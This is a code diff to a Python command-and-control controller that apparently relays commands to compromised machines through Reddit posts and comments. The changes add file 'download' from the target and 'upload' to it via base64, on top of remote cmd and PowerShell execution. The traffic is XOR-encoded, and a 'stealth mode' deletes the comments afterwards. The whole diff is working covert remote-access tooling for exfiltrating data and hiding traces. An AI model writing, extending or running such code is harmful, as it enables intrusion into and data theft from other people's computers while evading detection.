@@ -21,6 +21,20 @@ readline.set_completer(comp.complete)
 #define the host's OS
 hostOS = platform.system()        
 
+#Function to convert base64 to file
+def base64_to_file(base64_string, filename):
+    # decode the base64 string
+    decoded_data = base64.b64decode(base64_string).decode('utf-8')
+    # write the data to the file
+    with open(filename, 'wb') as f:
+        f.write(decoded_data.encode())
+
+#Function to encode a file to base64
+def encode_file_in_base64(filepath):
+    with open(filepath, 'rb') as file:
+        file_data = file.read()
+    return base64.b64encode(file_data).decode('utf-8')
+
 #list all listeners (all post titles in a specific Subreddit)
 def listListeners(subreddit_name):
     subreddit = reddit.subreddit(subreddit_name)
@@ -113,7 +127,12 @@ def readOutput(subreddit_name, title, command):
             #decode and decrypt the message
             decipher = decrypt(str(response), xor_key)
             
-            print("[+] Received Output:\n" + str(decipher))
+            if("download" in decipher):
+                pass
+            else:
+                print("[+] Received Output:\n" + str(decipher))
+            
+    return str(decipher)
 
 def sendCommand(subreddit_name, title, command):
     subreddit = reddit.subreddit(subreddit_name)
@@ -205,6 +224,19 @@ if __name__ == "__main__":
                                 os.system('cls')
                     
                         else:
+                            if(session_command[:8] == "download"):
+                                filename = session_command[9:] #save the file that user entered
+                                
+                            if(session_command[:6] == "upload"):
+                                filename = session_command[7:] #save the file that user entered
+                                session_command = "upload " + filename + " " + encode_file_in_base64(filename)
+                                if(len(session_command) > 10000):
+                                    print("[!] File is too large (" + str(len(session_command)) + "/10000 available characters)")
+                                    break
+                                else:
+                                    print("[+] Uploading " + filename + " to the target")
+                                
+                            
                             final_message = encrypt(session_command, xor_key)
                                           
                             #send the command
@@ -212,12 +244,25 @@ if __name__ == "__main__":
                             print("[+] Command sent")
                             #then read the output
                             #time.sleep(1) #give time for reddit to update
-                            readOutput(subreddit_name, selected_listener, str(final_message))
+                            
+                            if(session_command[:8] == "download"):
+                                fileContent = readOutput(subreddit_name, selected_listener, str(final_message))
+                                if("File is too large" in fileContent):
+                                    pass
+                                else:
+                                    base64_to_file(fileContent, "downloads/" + filename)
+                                    print("[+] File saved as " + filename)
+                                
+                            else:
+                                readOutput(subreddit_name, selected_listener, str(final_message))
+                            
+                            
                             #delete the comments if stealth_mode is set to 1 in config.json
                             if(stealth_mode == "1"):
                                 deleteComments(subreddit_name, selected_listener)
                             else:
                                 pass
+                                
                                 
                         #------------------------ AGENT FEATURES END HERE ------------------------
                 else:
@@ -241,6 +286,8 @@ list listeners                   --> List all listeners you can use within the s
 create listener [session number] --> Create a post in subreddit where the traffic will ocurr
 use listener [session number]    --> Interact With Each Session Individually
 run [command]                    --> Execute a cmd command
+download [file_name]             --> Download a file from the target
+upload [file_name]               --> Upload a file to the target
 powershell [command]             --> Execute a powershell command
 help                             --> Show the help menu
 exit                             --> Exit from the session
